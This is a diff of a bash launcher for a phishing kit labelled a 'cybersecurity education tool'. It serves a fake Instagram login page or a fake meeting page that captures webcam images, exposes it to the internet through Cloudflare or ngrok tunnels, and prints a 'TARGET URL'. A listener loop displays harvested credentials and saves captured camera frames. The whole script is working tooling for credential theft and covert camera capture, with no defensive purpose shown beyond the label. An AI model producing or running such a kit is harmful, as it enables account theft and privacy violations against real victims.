@@ -1,89 +1,295 @@
 #!/bin/bash
 
-# --- Color Definitions ---
-R='\033[1;31m'  # Red
-G='\033[1;32m'  # Green
-Y='\033[1;33m'  # Yellow
-B='\033[1;34m'  # Blue
-P='\033[1;35m'  # Purple
-C='\033[1;36m'  # Cyan
-W='\033[1;37m'  # White
-NC='\033[0m'     # No Color
+############################################
+# COLORS
+############################################
 
-# Clean Terminal on Start
-clear
+R='\033[1;31m'
+G='\033[1;32m'
+Y='\033[1;33m'
+B='\033[1;34m'
+P='\033[1;35m'
+C='\033[1;36m'
+W='\033[1;37m'
+NC='\033[0m'
 
-# --- Bold Professional Branding ---
-echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-echo -e "  ${C}TECHYFATCAT ${NC}─ ${W}Cybersecurity Education Tool v2.0${NC}"
-echo -e "  ${Y}Developer: ${NC}${G}Aadit Sarhadi${NC} | ${P}CSE 2nd Year${NC}"
-echo -e "  ${W}GitHub:    ${NC}${B}techyfatcat${NC}"
-echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-echo -e "  ${R}[!] Press CTRL+C to stop the tool at any time${NC}"
-echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
+############################################
+# DEPENDENCY CHECK
+############################################
 
-# --- Main Menu ---
-echo -e "${G}Select a Template:${NC}"
-echo -e "  ${B}[1]${NC} Instagram (Latest Dark UI)"
-echo -e "  ${B}[2]${NC} Online Meeting (Auto-Capture Image)"
-read -p "  Selection > " option
+check_command() {
 
-echo -e "\n${G}Select Tunneling Method:${NC}"
-echo -e "  ${B}[1]${NC} Localhost (Port 8080)"
-echo -e "  ${B}[2]${NC} Cloudflare"
-echo -e "  ${B}[3]${NC} Ngrok"
-read -p "  Selection > " tunnel
+if ! command -v $1 &> /dev/null
+then
 
-# --- Setup Paths & Clean Old Processes ---
-if [[ $option == "1" ]]; then
-    target_dir="modules/insta"
-    log_file="logs/output.txt"
-    echo -e "\n${Y}[*] Configuring Instagram Template...${NC}"
-elif [[ $option == "2" ]]; then
-    target_dir="modules/meeting"
-    log_file="logs/cam"
-    echo -e "\n${Y}[*] Configuring Meeting Template...${NC}"
+echo -e "${Y}[*] Installing $1 ...${NC}"
+
+sudo apt update > /dev/null 2>&1
+sudo apt install $2 -y > /dev/null 2>&1
+
+echo -e "${G}[+] $1 installed${NC}"
+
 else
-    echo -e "${R}[!] Invalid Option. Exiting.${NC}"
-    exit 1
+
+echo -e "${G}[+] $1 found${NC}"
+
 fi
 
-# Kill any existing PHP server on 8080
-fuser -k 8080/tcp > /dev/null 2>&1
+}
 
-# --- Launch Server ---
-echo -e "${Y}[*] Starting PHP Server...${NC}"
-cd $target_dir
-php -S 127.0.0.1:8080 > /dev/null 2>&1 &
-echo -e "${G}[+] Server Live at: ${W}http://127.0.0.1:8080${NC}"
+############################################
+# BASIC TOOLS
+############################################
 
-# Go back to root for log monitoring
-cd ../..
+clear
 
-echo -e "${C}[*] Waiting for incoming data...${NC}\n"
+echo -e "${C}Checking dependencies...${NC}"
 
-# --- Listener Loop ---
-while true; do
-    if [[ $option == "1" ]]; then
-        # Check for Credentials
-        if [[ -s logs/output.txt ]]; then
-            echo -e "${G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-            echo -e "  ${G}[SUCCESS] CREDENTIALS RECEIVED!${NC}"
-            cat logs/output.txt
-            echo -e "${G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-            # Clear file to prevent duplicate alerts
-            > logs/output.txt
-            echo -e "${Y}[*] Continuing listener...${NC}\n"
-        fi
-    elif [[ $option == "2" ]]; then
-        # Check for Images
-        count=$(ls -1 logs/cam/*.png 2>/dev/null | wc -l)
-        if [ $count -gt 0 ]; then
-            echo -e "  ${C}[IMAGE RECEIVED]${NC} Frame captured and saved in ${W}logs/cam/${NC}"
-            # Move to subfolder to acknowledge
-            mkdir -p logs/cam/received
-            mv logs/cam/*.png logs/cam/received/ 2>/dev/null
-        fi
-    fi
-    sleep 2
+check_command php php
+check_command curl curl
+check_command wget wget
+check_command unzip unzip
+
+############################################
+# NGROK CHECK
+############################################
+
+if [ ! -f "./ngrok" ]; then
+
+echo -e "${Y}[*] Downloading ngrok...${NC}"
+
+wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip > /dev/null 2>&1
+
+unzip ngrok-v3-stable-linux-amd64.zip > /dev/null 2>&1
+
+rm ngrok-v3-stable-linux-amd64.zip
+
+chmod +x ngrok
+
+echo -e "${G}[+] ngrok ready${NC}"
+
+fi
+
+############################################
+# CLOUDFLARED CHECK
+############################################
+
+if ! command -v cloudflared &> /dev/null
+then
+
+echo -e "${Y}[*] Installing cloudflared...${NC}"
+
+wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb > /dev/null 2>&1
+
+sudo dpkg -i cloudflared-linux-amd64.deb > /dev/null 2>&1
+
+rm cloudflared-linux-amd64.deb
+
+echo -e "${G}[+] cloudflared ready${NC}"
+
+fi
+
+############################################
+# CLEAN SCREEN
+############################################
+
+clear
+
+############################################
+# BRANDING
+############################################
+
+echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+echo -e "  ${C}TECHYFATCAT ${NC}─ ${W}Cybersecurity Education Tool v2.0${NC}"
+echo -e "  ${Y}Developer:${NC} ${G}Aadit Sarhadi${NC} | ${P}CSE 2nd Year${NC}"
+echo -e "  ${W}GitHub:${NC} ${B}techyfatcat${NC}"
+echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+
+echo -e "  ${R}[!] Press CTRL+C anytime to stop the tool${NC}"
+
+echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+
+############################################
+# MENU
+############################################
+
+echo
+echo -e "${G}Select Template:${NC}"
+
+echo -e "  ${B}[1]${NC} Instagram (Dark UI)"
+
+echo -e "  ${B}[2]${NC} Online Meeting (Camera Capture)"
+
+read -p "  Selection > " option
+
+
+echo
+echo -e "${G}Select Tunnel Method:${NC}"
+
+echo -e "  ${B}[1]${NC} Localhost"
+
+echo -e "  ${B}[2]${NC} Cloudflare"
+
+echo -e "  ${B}[3]${NC} Ngrok"
+
+read -p "  Selection > " tunnel
+
+############################################
+# PATH CONFIG
+############################################
+
+ROOT_DIR="$(pwd)"
+
+if [[ $option == "1" ]]; then
+
+TARGET_DIR="$ROOT_DIR/modules/insta"
+
+LOG_FILE="$ROOT_DIR/logs/output.txt"
+
+echo -e "\n${Y}[*] Loading Instagram template...${NC}"
+
+elif [[ $option == "2" ]]; then
+
+TARGET_DIR="$ROOT_DIR/modules/meeting"
+
+CAM_DIR="$ROOT_DIR/logs/cam"
+
+echo -e "\n${Y}[*] Loading Meeting template...${NC}"
+
+else
+
+echo -e "${R}[!] Invalid option${NC}"
+
+exit 1
+
+fi
+
+############################################
+# CLEAN OLD PROCESSES
+############################################
+
+pkill php > /dev/null 2>&1
+pkill ngrok > /dev/null 2>&1
+pkill cloudflared > /dev/null 2>&1
+
+############################################
+# START PHP SERVER
+############################################
+
+echo -e "${Y}[*] Starting PHP server...${NC}"
+
+php -S 127.0.0.1:8080 -t "$TARGET_DIR" > /dev/null 2>&1 &
+
+sleep 2
+
+############################################
+# START TUNNEL
+############################################
+
+if [[ $tunnel == "1" ]]; then
+
+FINAL_URL="http://127.0.0.1:8080"
+
+echo -e "${G}[+] Running on localhost${NC}"
+
+elif [[ $tunnel == "2" ]]; then
+
+echo -e "${Y}[*] Starting Cloudflare tunnel...${NC}"
+
+cloudflared tunnel --url http://127.0.0.1:8080 > cloudflare.log 2>&1 &
+
+sleep 8
+
+FINAL_URL=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' cloudflare.log)
+
+echo -e "${G}[+] Cloudflare tunnel ready${NC}"
+
+elif [[ $tunnel == "3" ]]; then
+
+echo -e "${Y}[*] Starting Ngrok tunnel...${NC}"
+
+./ngrok http 8080 > /dev/null 2>&1 &
+
+sleep 6
+
+FINAL_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^"]*')
+
+echo -e "${G}[+] Ngrok tunnel ready${NC}"
+
+else
+
+echo -e "${R}[!] Invalid tunnel option${NC}"
+
+exit 1
+
+fi
+
+############################################
+# SHOW LINK
+############################################
+
+echo
+echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+
+echo -e " ${G}TARGET URL${NC}"
+
+echo -e " ${W}$FINAL_URL${NC}"
+
+echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+
+echo
+echo -e "${C}[*] Waiting for incoming data...${NC}"
+
+############################################
+# LISTENER LOOP
+############################################
+
+while true
+do
+
+############################################
+# INSTAGRAM LOGGER
+############################################
+
+if [[ $option == "1" ]]; then
+
+if [[ -s "$LOG_FILE" ]]; then
+
+echo
+echo -e "${G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+
+echo -e " ${G}[CREDENTIALS RECEIVED]${NC}"
+
+echo -e "${G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+
+cat "$LOG_FILE"
+
+echo -e "${G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+
+> "$LOG_FILE"
+
+fi
+
+############################################
+# CAMERA LOGGER
+############################################
+
+elif [[ $option == "2" ]]; then
+
+for img in "$CAM_DIR"/*.png; do
+
+[ -e "$img" ] || continue
+
+filename=$(basename "$img")
+
+echo -e " ${C}[IMAGE RECEIVED]${NC} $filename saved in logs/cam"
+
+mv "$img" "$CAM_DIR/received_$filename"
+
+done
+
+fi
+
+sleep 2
+
 done
